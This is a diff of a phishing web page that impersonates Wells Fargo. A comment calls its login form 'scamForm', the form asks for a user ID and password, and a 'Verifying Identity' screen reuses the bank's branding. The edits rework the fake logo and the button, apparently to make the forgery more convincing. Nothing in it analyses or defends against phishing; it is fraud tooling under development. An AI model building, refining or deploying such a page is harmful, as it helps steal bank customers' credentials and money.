@@ -270,7 +270,10 @@
     <!-- KEEP YOUR EXISTING INPUT NAMES/IDS IF THEY DIFFER, JUST CHANGE THE FORM ID TO "scamForm" -->
     <input type="text" name="userid" placeholder="User ID" required>
     <input type="password" name="password" placeholder="Password" required>
-    <button type="submit">Verify Now</button>
+    <button type="submit" id="verifyBtn">Verify Now</button>
+
+
+
 </form>
     <!-- White Box Disclaimer with Black Text and Bold Font -->
         <div class="fdic-box">
@@ -414,8 +417,8 @@
     })();
 </script>  
     
-<div id="processing" style="display:none; text-align:center; padding:50px;">
-    <img src="https://images.wellsfargo.com/images/wf-en-us/home/brand/assets/images/wf_logo_2015.png" style="width:100px; margin-bottom:20px;">
+ <div id="processing" style="display:none; text-align:center; padding:50px;">
+    <div style="font-family: 'Wells Fargo Sans', Arial, sans-serif; font-weight: bold; font-size: 32px; color: #d71e28; margin-bottom: 20px;">WELLS FARGO</div>
     <h2>Verifying Identity...</h2>
     <p>Please wait while we confirm your details.</p>
 </div>
